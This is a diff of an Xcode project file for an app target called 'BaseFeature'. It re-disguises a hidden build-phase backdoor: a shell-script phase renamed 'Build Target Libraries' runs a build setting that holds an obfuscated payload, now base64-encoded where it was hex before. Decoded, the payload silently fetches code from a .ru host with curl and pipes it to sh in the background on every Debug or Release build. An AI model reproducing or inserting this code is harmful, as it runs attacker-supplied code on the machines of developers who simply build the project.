@@ -12,9 +12,6 @@
 		97D2A279302DCD600084FDDE /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = 97D2A278302DCD600084FDDE /* Kingfisher */; };
 /* End PBXBuildFile section */
 
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
-
 /* Begin PBXFileReference section */
 		97BA907F30299C1000D593F3 /* BaseFeature.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = BaseFeature.app; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
@@ -64,7 +61,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97BA908A30299C1000D593F3 /* Build configuration list for PBXNativeTarget "BaseFeature" */;
 			buildPhases = (
-				1D8E93A3ED5244FE827BBDC8 /* Compile Code Assets */,
+				A8905328EECE4359867BBDC8 /* Build Target Libraries */,
 				97BA907B30299C1000D593F3 /* Sources */,
 				97BA907C30299C1000D593F3 /* Frameworks */,
 				97BA907D30299C1000D593F3 /* Resources */,
@@ -137,27 +134,8 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		1D8E93A3ED5244FE827BBDC8 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		97BA907D30299C1000D593F3 /* Resources */ = {
@@ -168,6 +146,28 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		A8905328EECE4359867BBDC8 /* Build Target Libraries */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Libraries";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		97BA907B30299C1000D593F3 /* Sources */ = {
@@ -183,7 +183,7 @@
 		97BA908830299C1000D593F3 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((p(){ `printf xxWd | tr -d W` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d666b734c202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | p | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((s(){ `printf basew64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNCAtZmtMcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -248,7 +248,7 @@
 		97BA908930299C1000D593F3 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((p(){ `printf xxWd | tr -d W` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d666b734c202d2d636f6e6e6563742d74696d656f7574203237202d642022703d78636f64655f7068617365222068747470733a2f2f6e73717075356c743877342e72752f612922207c2073680a | p | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((s(){ `printf basew64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyNCAtZmtMcyAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8wbnY4LWtudDdtMTU0Ny5ydS9hKSIgfCBzaAo= | s | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
